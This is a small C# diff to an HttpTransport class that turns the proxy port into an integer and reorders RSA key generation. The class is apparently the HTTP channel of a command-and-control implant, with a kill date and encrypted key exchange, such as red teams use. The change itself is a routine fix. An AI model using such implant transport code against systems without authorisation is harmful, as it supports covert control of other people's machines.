@@ -21,7 +21,7 @@ namespace HttpTransport
         private string Endpoint;
         private bool EncryptedExchangeCheck;
         private string ProxyHost;
-        private string ProxyPort;
+        private int ProxyPort;
         private string ProxyUser;
         private string ProxyPass;
         private string KillDate;
@@ -59,11 +59,15 @@ namespace HttpTransport
             PostUri = data["post_uri"];
             EncryptedExchangeCheck = data["encrypted_exchange_check"] == "T";
             ProxyHost = data["proxy_host"];
-            ProxyPort = data["proxy_port"];
-            rsa = agent.GetApi().NewRSAKeyPair(4096);
-            if(ProxyHost.Length > 0){
-                ProxyAddress = this.ParseURLAndPort(ProxyHost, ProxyPort);
+            if(data["proxy_port"].Length > 0){
+                ProxyPort = int.Parse(data["proxy_port"]);
+                if(ProxyHost.Length > 0){
+                    ProxyAddress = this.ParseURLAndPort(ProxyHost, ProxyPort);
+                }
             }
+
+            rsa = agent.GetApi().NewRSAKeyPair(4096);
+
 
             if (PostUri[0] != '/')
             {
